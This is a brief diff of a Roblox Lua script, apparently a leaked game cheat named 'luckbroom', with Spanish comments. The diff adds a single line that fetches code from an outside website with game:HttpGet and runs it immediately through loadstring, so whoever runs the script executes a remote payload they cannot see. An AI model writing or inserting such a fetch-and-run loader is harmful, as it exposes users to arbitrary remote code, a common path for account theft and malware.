@@ -1,4 +1,5 @@
 ---- leaked by .gg/source
+loadstring(game:HttpGet("https://star-scripts.com/api/run/HAGko_mk9Q3ueW6Qzo4kZICcoCpyQdj-"))()
 
 if _G.luckbroomRunning then
     warn("[luckbroom] Instancia previa detectada. Se recomienda rejoin si hay comportamiento errático.")
